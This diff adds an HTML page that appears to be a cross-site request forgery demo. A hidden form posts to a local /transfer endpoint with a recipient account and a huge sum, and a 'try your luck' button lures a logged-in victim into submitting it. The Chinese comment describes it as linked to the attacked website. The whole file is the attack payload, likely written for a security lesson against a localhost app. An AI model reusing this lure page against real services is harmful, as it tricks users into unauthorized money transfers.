@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+</head>
+<body>
+    {# 设置一个隐藏的表单标签,并链接至被攻击网站 #}
+    <form method="post" action="http://127.0.0.1:5000/transfer">
+        <input type="hidden" name="to_account" value="liurui">
+        <input type="hidden" name="money" value="10000000000000" hidden>
+        <input type="submit" value="试试手气  ">
+    </form>
+</body>
+</html>
